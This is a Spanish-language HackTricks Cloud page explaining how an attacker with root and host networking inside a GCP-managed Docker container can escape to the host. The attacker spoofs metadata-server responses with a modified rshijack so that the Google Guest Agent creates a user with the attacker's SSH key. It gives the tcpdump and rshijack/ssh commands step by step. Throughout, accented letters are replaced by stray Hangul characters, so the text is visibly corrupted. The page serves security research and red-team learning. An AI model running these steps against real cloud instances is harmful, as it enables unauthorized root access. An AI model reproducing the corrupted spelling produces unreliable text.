# GCP - Escape de Docker de Red

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Entrenamiento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Entrenamiento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* 춰Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
{% endhint %}

## Estado Inicial

En ambos informes donde se especifica esta t칠cnica, los atacantes lograron obtener acceso de **root** dentro de un contenedor **Docker** administrado por GCP con acceso a la red del host (y las capacidades **`CAP_NET_ADMIN`** y **`CAP_NET_RAW`**).

## Explicaci칩n del Ataque

En una instancia de Google Compute Engine, la inspecci칩n regular del tr치fico de red revela numerosas **solicitudes HTTP sin formato** al **metadata instance** en `169.254.169.254`. El [**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent), un servicio de c칩digo abierto, realiza frecuentemente tales solicitudes.

Este agente est치 dise침ado para **monitorizar cambios en el metadata**. Especialmente, el metadata incluye un **campo para claves p칰blicas SSH**. Cuando se agrega una nueva clave p칰blica SSH al metadata, el agente la autoriza autom치ticamente en el archivo `.authorized_key`. Tambi칠n puede **crear un nuevo usuario** y agregarlo a **sudoers** si es necesario.

El agente monitoriza los cambios enviando una solicitud para **recuperar todos los valores del metadata de forma recursiva** (`GET /computeMetadata/v1/?recursive=true`). Esta solicitud est치 dise침ada para hacer que el servidor de metadata env칤e una respuesta solo si hay alg칰n cambio en el metadata desde la 칰ltima recuperaci칩n, identificado por un Etag (`wait_for_change=true&last_etag=`). Adem치s, se incluye un par치metro de **timeout** (`timeout_sec=`). Si no ocurre ning칰n cambio dentro del tiempo de espera especificado, el servidor responde con los **valores sin cambios**.

Este proceso permite que el **IMDS** (Instance Metadata Service) responda despu칠s de **60 segundos** si no ha ocurrido ning칰n cambio de configuraci칩n, creando una **ventana potencial para inyectar una respuesta de configuraci칩n falsa** al agente invitado.

Un atacante podr칤a explotar esto realizando un ataque de **Man-in-the-Middle (MitM)**, falsificando la respuesta del servidor IMDS e **insertando una nueva clave p칰blica**. Esto podr칤a permitir el acceso SSH no autorizado al host.

### T칠cnica de Escape

Si bien el ARP spoofing es ineficaz en las redes de Google Compute Engine, se puede utilizar una [**versi칩n modificada de rshijack**](https://github.com/ezequielpereira/rshijack) desarrollada por [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html) para la inyecci칩n de paquetes en la comunicaci칩n e inyectar el usuario SSH.

Esta versi칩n de rshijack permite ingresar los n칰meros de ACK y SEQ como argumentos de l칤nea de comandos, facilitando la falsificaci칩n de una respuesta antes de la respuesta real del servidor de Metadata. Adem치s, se utiliza un [**peque침o script de Shell**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) para devolver un **payload especialmente dise침ado**. Este payload activa al Google Guest Agent para **crear un usuario `wouter`** con una clave p칰blica especificada en el archivo `.authorized_keys`.

El script utiliza el mismo ETag para evitar que el servidor de Metadata notifique inmediatamente al Google Guest Agent sobre valores de metadata diferentes, retrasando as칤 la respuesta.

Para ejecutar la falsificaci칩n, son necesarios los siguientes pasos:

1. **Monitorear las solicitudes al servidor de Metadata** utilizando **tcpdump**:
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
Busque una l칤nea similar a:
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
2. Enviar los datos de metadatos falsos con el ETAG correcto a rshijack:
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
Este paso autoriza la clave p칰blica, permitiendo la conexi칩n SSH con la clave privada correspondiente.


## Referencias

* [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
* [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
